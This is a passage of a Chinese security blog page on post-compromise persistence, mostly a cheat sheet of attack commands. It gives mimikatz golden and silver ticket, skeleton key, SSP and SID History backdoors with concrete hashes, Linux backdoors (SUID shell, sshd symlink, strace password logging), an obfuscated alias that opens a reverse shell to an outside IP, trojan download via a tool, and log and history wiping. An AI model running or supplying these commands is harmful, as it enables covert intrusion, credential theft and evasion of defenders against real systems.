class="line">历史记录.&#123;FF393560-C2A7-11CF-BFF4-444553540000&#125;</span><br><span class="line">目录.&#123;fe1290f0-cfbd-11cf-a330-00aa00c16e65&#125;</span><br><span class="line">Internet Explorer.&#123;FBF23B42-E3F0-101B-8488-00AA003E56F8&#125;</span><br><span class="line">Snapshot File.&#123;FACB5ED2-7F99-11D0-ADE2-00A0C90DC8D9&#125;</span><br><span class="line">预订文件夹.&#123;F5175861-2688-11d0-9C5E-00AA00A45957&#125;</span><br><span class="line">MyDocs Drop Target.&#123;ECF03A32-103D-11d2-854D-006008059367&#125;</span><br><span class="line">Policy Package.&#123;ecabaebd-7f19-11d2-978E-0000f8757e2a&#125;</span><br><span class="line">搜索结果.&#123;e17d4fc0-5564-11d1-83f2-00a0c90dc849&#125;</span><br><span class="line">添加网上邻居.&#123;D4480A50-BA28-11d1-8E75-00C04FA31A86&#125;</span><br><span class="line">Paint.&#123;D3E34B21-9D75-101A-8C3D-00AA001A1652&#125;</span><br><span class="line">管理工具.&#123;D20EA4E1-3957-11d2-A40B-0C5020524153&#125;</span><br><span class="line">字体.&#123;D20EA4E1-3957-11d2-A40B-0C5020524152&#125;</span><br><span class="line">Web Folders.&#123;BDEADF00-C265-11d0-BCED-00A0C90AB50F&#125;</span><br><span class="line">DocFind Command.&#123;B005E690-678D-11d1-B758-00A0C90564FE&#125;</span><br><span class="line">脱机文件夹.&#123;AFDB1F70-2A4C-11d2-9039-00C04F8EEB3E&#125;</span><br><span class="line">打印机.&#123;2227A280-3AEA-1069-A2DE-08002B30309D&#125;</span><br><span class="line"></span><br><span class="line">其他还有畸形文件夹、保留文件名无法删除和利用 Easy File Locker 实现驱动级文件隐藏等等，或者直接起一个看起来名称很像的文件，比如 Index.php 和 lndex.php，这里其中一个是大写的 i，一个是小写的 L。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域后门</span><br><span class="line">	1、黄金票据</span><br><span class="line">		通过黄金票据可以实现域内任意用户的伪造，因此即使目标域管的密码被修改了，通过黄金票据还是能够获取到对方的权限。</span><br><span class="line"></span><br><span class="line">在生成黄金票据前，需要先获取以下信息：</span><br><span class="line">    krbtgt 的 NTLM Hash 或 AES-256 值</span><br><span class="line">    伪造的域管理员用户名</span><br><span class="line">    完整的域名</span><br><span class="line">    域 SID</span><br><span class="line"></span><br><span class="line">其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</span><br><span class="line"></span><br><span class="line">在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</span><br><span class="line"></span><br><span class="line">使用 mimikatz 在域控上获取 krbtgt 用户的 NTLM HASH</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:dc.com /user:krbtgt&quot; exit</span><br><span class="line">从图中可以看到 krbtgt 的 </span><br><span class="line">NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</span><br><span class="line">SID 为 S-1-5-21-284927032-1122706408-2778656994</span><br><span class="line">此时已知域名为 teamssix.com，那么这时所需要的信息就全了。</span><br><span class="line"></span><br><span class="line">制作黄金票据</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:teamssix.com /sid:S-1-5-21-284927032-1122706408-2778656994 /krbtgt:d685b9c4fa2d318a9943ed68948af087 /ticket:Administrator.kirib</span><br><span class="line">		kerberos::purge </span><br><span class="line">kerberos::ppt golden.kiribi </span><br><span class="line">kerberos::list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		mimikatz # kerberos::golden /admin:admin /domain:demo.com  /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63  /ptt</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:teamssix.com /user:krbtgt&quot; exit</span><br><span class="line">/admin：伪造的账号</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：域SID，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt账号的密码哈希值</span><br><span class="line">/ticket：生成的票据名称</span><br><span class="line">/ptt：表示的是 Pass The Ticket 攻击，是把生成的票据导入内存，也可以使用/ticket 导出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 mimikatz 进行票据传递</span><br><span class="line">kerberos::ptt Administrator.kiribi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	2、白银票据</span><br><span class="line">		白银票据和黄金票据的区别如下：</span><br><span class="line"></span><br><span class="line">		1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志，因此白银票据更加隐蔽。</span><br><span class="line"></span><br><span class="line">		2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，所以白银票据的权限就远不如黄金票据的权限了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		/domain：当前域名称</span><br><span class="line">/sid：SID值，和金票一样取前面一部分</span><br><span class="line">/target：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line">/service：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line">/rc4：目标主机的HASH值</span><br><span class="line">/user：伪造的用户名</span><br><span class="line">/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使 /ticket:Administrator.kirib</span><br><span class="line">用kerberos::ptt来导入</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	3、SSP 权限维持</span><br><span class="line"></span><br><span class="line">		通过 SSP 权限维持，用户在登录时，密码将会以明文的形式保存在</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\mimilsa.log 下。</span><br><span class="line">使用 mimikatz 将伪造的 SSP 注入内存，但如果域控重启，被注入内存的伪造 SSP 就会丢失。</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br><span class="line">注销当前用户，输入用户名密码后重新登录，就可以获取到明文密码了。</span><br><span class="line"></span><br><span class="line">也可以使用 mimikatz 中的 mimilib.dll 文件进行 SSP 权限维持，这种方法重启后也不会失效。</span><br><span class="line"></span><br><span class="line">	4、SID History 后门</span><br><span class="line"></span><br><span class="line">		每个用户都有自己的安全标识符即 SID，SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。</span><br><span class="line"></span><br><span class="line">这里使用 mimikatz 将管理员的 SID 添加到普通用户的 SID History 中。</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:test /new:administrator</span><br><span class="line">使用 test 用户登录，可以看到已经拥有了管理员权限。</span><br><span class="line"></span><br><span class="line">	5、万能密码</span><br><span class="line"></span><br><span class="line">		在域管权限下，使用 mimikatz 即可。</span><br><span class="line">.\mimikatz.exe &quot;privilege::debug&quot; &quot;misc::skeleton&quot; exit</span><br><span class="line">此时，就可以在域内以任意用户的身份利用 mimikatz 密码进行登录了。</span><br><span class="line">net use \\dc\ipc$ &quot;mimikatz&quot; /user:teamssix\administrator</span><br><span class="line">除了上面的方法外，还可以使用 DSRM 账号进行权限维持，也可以使用 Hook PasswordChangeNotify 脚本查看目标用户修改后的新密码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux 主机后门</span><br><span class="line">	1、添加用户</span><br><span class="line"></span><br><span class="line">		一句话添加用户</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br><span class="line">或者使用 openssl</span><br><span class="line">useradd -p `openssl passwd -1 -salt &apos;salt&apos; 123456` guest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	2、SUID Shell</span><br><span class="line"></span><br><span class="line">		SUID Shell是一种可用于以拥有者权限运行的shell。</span><br><span class="line">以 root 用户权限执行下面的命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br><span class="line"></span><br><span class="line">在使用普通用户权限的时候，执行以下命令就能获取 root 权限。</span><br><span class="line">/tmp/shell -p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	3、软链接</span><br><span class="line"></span><br><span class="line">		软链接的利用前提是 ssh 配置中开启了 PAM 进行身份验证，使用以下命令查看是否配置 PAM 认证。</span><br><span class="line">cat /etc/ssh/sshd_config | grep UsePAM</span><br><span class="line">在目标主机上执行一句话后门</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br><span class="line">然后直接 ssh root@IP -p 8888，输入任意密码，就可以登录。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	4、strace 后门</span><br><span class="line"></span><br><span class="line">		执行以下命令</span><br><span class="line">alias ssh=&apos;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&apos;</span><br><span class="line"></span><br><span class="line">这时当用户使用 ssh 连接其他主机时，在 /tmp/.ssh.log 下就能看到连接的密码、操作了，只是显示的不是很直观。</span><br><span class="line"></span><br><span class="line">这个其实也可以说是 alias 后门，例如下面这条命令。</span><br><span class="line"></span><br><span class="line">alias ls=&apos;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&apos;\&apos;&apos;UTF-8&apos;\&apos;&apos;)&#125;[sys.version_info[0]](&apos;\&apos;&apos;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4yNDEuMTI4IiwgNjY2NikpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk=&apos;\&apos;&apos;)))&quot;;&#125;;alerts&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上面的 base64 解码后为以下内容：</span><br><span class="line"></span><br><span class="line">import os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line">if ret &gt; 0:</span><br><span class="line">exit()</span><br><span class="line">else:</span><br><span class="line">try:</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.241.128&quot;, 6666))</span><br><span class="line">os.dup2(s.fileno(), 0)</span><br><span class="line">os.dup2(s.fileno(), 1)</span><br><span class="line">os.dup2(s.fileno(), 2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;, &quot;-i&quot;])</span><br><span class="line">except Exception as e:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这样当用户使用 ls 命令时，就会反弹 shell 回来了，当然除了反弹 shell 还可以做很多的其他操作。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	除此之外</span><br><span class="line"></span><br><span class="line">		介绍</span><br><span class="line">			还有比较常见的定时任务、SSH 公钥登录以及 SSH warpper、openssh 后门、PAM 后门、rootkit 后门等等。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		1、隐藏文件时间戳</span><br><span class="line"></span><br><span class="line">			复制其他文件的时间</span><br><span class="line"></span><br><span class="line">touch -r teamssix.txt evil.txt</span><br><span class="line">自定义文件的时间，这里表示将时间改为 2022 年的 1 月 1 日 1 时 1 分 1 秒。</span><br><span class="line"></span><br><span class="line">touch -t 202201010101.01 evil.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		2、隐身登录</span><br><span class="line"></span><br><span class="line">			隐身登录系统，不会被 w、who、last 检测到</span><br><span class="line"></span><br><span class="line">ssh -T root@host /bin/bash -i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">隐身登录系统，同时不保存公钥在本地的 .ssh 目录中。</span><br><span class="line"></span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class="line"></span><br><span class="line">		3、锁定文件</span><br><span class="line"></span><br><span class="line">			当文件被锁定时，是无法删除的</span><br><span class="line"></span><br><span class="line">chattr +i evil.txt 锁定文件</span><br><span class="line">lsattr evil.txt 属性查看</span><br><span class="line">chattr -i evil.txt 解除锁定</span><br><span class="line">rm -rf 1.evil.txt 删除文件</span><br><span class="line"></span><br><span class="line">		4、隐藏历史操作记录</span><br><span class="line"></span><br><span class="line">			临时禁用历史命令记录功能。</span><br><span class="line">set +o history</span><br><span class="line"></span><br><span class="line">注意在 set 命令前有一个空格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果想某条命令不记录到 history 中，直接在命令前加上空格就行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者先 grep 看下要删除的文件行，再 -d 指定行即可删除。</span><br><span class="line"></span><br><span class="line">history | grep &quot;key&quot;</span><br><span class="line">history -d 11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">除此之外，还有在文件前加上 . 实现隐藏文件以及端口复用、进程隐藏等等方法。</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">工具</span><br><span class="line">	Telemetry</span><br><span class="line">		https://github.com/360-Linton-Lab/Telemetry</span><br><span class="line"></span><br><span class="line">		执行没有文件后门的命令</span><br><span class="line">Telemetry.exe install /command:calc</span><br><span class="line">1</span><br><span class="line">远程下载木马文件进行后门启动</span><br><span class="line">Telemetry.exe install /url:http://vps:8089/System.exe</span><br><span class="line">	Remote_ShellcodeLoader</span><br><span class="line">		https://github.com/LDrakura/Remote_ShellcodeLoader</span><br><span class="line"></span><br><span class="line">	WMIHACKER</span><br><span class="line"></span><br><span class="line">		https://github.com/rootclay/WMIHACKER</span><br><span class="line"></span><br><span class="line">		缺点：需要对方开启rpc，有些机器是不会开的</span><br><span class="line"></span><br><span class="line">		命令执行后显示结果</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line">命令执行后不显示结果</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line">外壳模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line">文件上传：将本地的calc.exe复制到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line">文件下载：将远程主机calc.exe下载到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br><span class="line">		说⼀下这个⼯具如何在pth或者make_token下⼯作</span><br><span class="line">cscript //nologo WMIHACKER_06.vbs /cmd 192.168.1.4 - - whoami 1</span><br><span class="line">只要账号密码位为-，那么就会直接使⽤内存的凭证去连接wmi并执⾏后⾯的操作</span><br><span class="line">	sharpwmi</span><br><span class="line"></span><br><span class="line">		https://github.com/QAX-A-Team/sharpwmi</span><br><span class="line"></span><br><span class="line">		这是一个基于135端口来进行横向移动的工具,具有执行命令和上传文件功能,通过wmi来执行命令,通过注册表来进行数据传输.</span><br><span class="line"></span><br><span class="line">		缺点：需要对方开启rpc，有些机器是不会开的</span><br><span class="line"></span><br><span class="line">	powershell.exe&quot; -NoP -NonI -ep bypass -e </span><br><span class="line"></span><br><span class="line">	dll</span><br></pre></td></tr></table></figure>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/内网/权限维持/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/内网/内网提权合集/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/复现/1 - 副本 (4)/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
